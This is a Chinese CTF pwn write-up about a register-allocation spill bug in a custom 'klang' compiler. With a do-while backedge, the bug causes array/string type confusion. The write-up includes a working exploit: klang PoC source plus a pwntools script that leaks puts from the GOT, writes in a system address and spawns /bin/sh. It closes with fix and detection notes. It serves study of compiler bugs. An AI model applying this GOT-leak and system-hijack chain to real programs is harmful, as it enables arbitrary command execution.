---
id: ctf-pwn-compiler-regalloc-spill-live-interval-array-string-confusion
title: klang 编译器寄存器分配 spill 只替换 live interval 后半段：带 backedge 时 array/string 类型混淆 → GOT 泄露与 system 劫持
type: scenario
domain: ctf
path: ctf/pwn
technique: compiler-regalloc-spill-live-interval-half-array-string-confusion
tags:
- ctf
- compiler
- register-allocation
- spill
- backedge
- type-confusion
- pwn
- got
- system
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V483
  verified_at: '2026-11-10T20:58:41+08:00'
  notes: 已对照原文核对：寄存器分配 spill 只替换 live interval 后半段、backedge 致 array/string 混淆、GOT 0x404018 泄露 puts→写 system→prints(/bin/sh) 与 exp.klang/x.py 一致；偏移依赖题目二进制，未复跑
url: /docs/ctf/pwn/ctf-pwn-compiler-regalloc-spill-live-interval-array-string-confusion/
draft: false
kb_aliases:
- klang 编译器漏洞
- 寄存器分配 spill bug
- live interval 后半段替换
- array string 类型混淆
- backedge 寄存器映射
- 自研编译器 pwn
---

## 一句话结论

自研编译器 klang 在寄存器分配阶段遇到 Spill 时，只把 live interval 的后半段替换成 spill slot、前半段仍保留原虚拟寄存器映射；当控制流存在 backedge（do-while 循环）时，同一变量在不同轮次会落到不同存储位置，且 array 与 string 的寄存器/槽位可被混用，攻击者据此让数组元素被当作字符串指针，先泄露 puts GOT、再把值写成 system 地址，最后由 `prints("/bin/sh")` 触发命令执行。

## 原理

- **Spill 的正确做法**：寄存器压力大时，一个虚拟寄存器的 live interval 会被拆成多段，每段要么分配物理寄存器、要么溢出到栈槽；拆分点前后的所有使用/定义都必须按各自段重写。
- **实现缺陷**：klang 在替换虚拟寄存器时，遇到 Spill 只把 live interval 的后半段替换为 spill slot，前半段仍按原虚拟寄存器处理；对于没有回边的直线代码，这种“半替换”可能刚好不出错，但循环的 backedge 会让执行重新回到前半段，导致变量在“寄存器版本”和“栈槽版本”之间来回切换。
- **类型混淆**：当 array 与 string 变量的虚拟寄存器/槽位在上述错误映射下重叠时，程序会把数组对象当成字符串对象（或反之）使用；攻击者可以让数组元素承载任意 64 位值，再通过字符串打印路径把它当作指针解引用。
- **泄露与劫持**：把数组元素写成 GOT 表项地址，用字符串打印函数把该地址处的值（如 puts 的真实地址）输出，即可泄露 libc；再把同一个“字符串指针”槽位写成 system 地址，随后 `prints("/bin/sh")` 就会调用 system("/bin/sh")。
- **辅助 bug（非预期解）**：IR 优化 DCE 对 Call/CallVoid/ArrayStore 处理不当，若后续寄存器被重新赋值，会错误消除前面的 Assign；IR 生成对 do-while 中的 return 处理不当，可让 ret 出现在基本块中间，从而跳到任意地址。

## 触发条件

- 目标运行 klang 编译出的程序（或直接向在线编译服务提交源码）。
- 源程序同时使用 array 与 string 类型，并存在 do-while/循环回边以触发 live interval 前后段不一致。
- 攻击者能控制数组元素与输入值，且程序链接了 libc（GOT 可写、puts/system 可用）。
- 编译器未做额外的运行时类型检查（自研语言默认无）。

## 利用步骤

1. 构造 `hack()` 函数：创建多个 array 变量、一个 string 变量，在 do-while 循环中根据输入反复 `array_new(c[0])` 并读写 `inputs()`，制造寄存器压力与回边。
2. 让 `hack()` 返回被混淆的 array，在 `main` 中 `x := hack(); printi(x[0]); x[0] := inputi(); prints("/bin/sh");`。
3. 用输入控制循环次数（如先输入 2 再输入 1），并在字符串输入位置写入目标地址/值。
4. 观察 `printi(x[0])`/打印路径输出，确认数组元素被当作字符串指针，读出 GOT 中的 puts 地址。
5. 计算 libc 基址与 system 地址，通过 `x[0] := inputi()` 写入 system 地址。
6. 执行 `prints("/bin/sh")` 触发 system，拿到 shell 后读 flag。

## PoC

```text
function main() : array x -> int {
    prints("hello");
    x := hack();
    printi(x[0]);
    x[0] := inputi();
    prints("/bin/sh");
    return 0;
}

function hack() : array a, int b, array c, array d, array e, array f, array g, string h, string i -> array {
    a := array_new(4); b := 1;
    c := array_new(4); d := array_new(4); e := array_new(4); f := array_new(4); g := array_new(4);
    do {
        b := inputi();
        if (b == 1234) {
            c := array_new(c[0]); d := array_new(d[0]); e := array_new(e[0]);
            f := array_new(f[0]); g := array_new(g[0]);
        };
        b := b - 1;
        i := inputs();
        h := inputs();
    } while (b > 0);
    printi(b);
    return d;
}
```

```python
# 关键交互：GOT 地址 + 填充 → 循环次数 → 读泄露 → 写 system
p.recvuntil(b"hello\n")
payload = p64(0x404018) + b"B" * 8 + b"C" * 8
p.sendline(b"2"); p.sendline(payload); p.sendline(payload)
p.sendline(b"1"); p.sendline(b"a"); p.sendline(b"a")
p.recvline()
puts = int(p.recvline().strip().decode())
system = puts - 0x84420 + 0x52290
p.sendline(str(system))
p.interactive()
```

## 变体与关联

- 变体：非预期解 1 利用 DCE 错误删除函数开头初始化 Assign；非预期解 2 利用 do-while 中 return 使 ret 落在基本块中间跳转任意地址。
- 变体：同类“编译器优化错误导致类型混淆”的题可先看 IR/寄存器分配代码，再针对 spill/回边构造最小触发。
- 关联：自定义 VM/编译器的逆向与利用见 [[ctf-reverse-custom-vm-isa-rol24-xor-base64-inverse]]；CTF 中 GOT 泄露与 system 劫持的通用收尾见 [[binary-pwn-libc-got-plt-hijack-full-relro-bypass]]。
- 边界：原文只给出 exp 与关键交互，未给出编译器完整源码/偏移来源；换题目需重新确认 GOT 地址、puts/system 偏移与寄存器压力布局。

## 检测与防御

- 修复：Spill 拆分 live interval 时对拆分点前后的所有 use/def 统一重写；对 do-while 中的 return 与 DCE 的 Call/ArrayStore 做正确性校验。
- 加固：编译器加入类型检查/运行时标签，或在生成代码中对 array/string 操作做类型断言。
- 检测：编译产物在循环回边处出现寄存器与栈槽不一致；CTF 环境关注异常的 GOT 读写与 `prints` 调用参数。
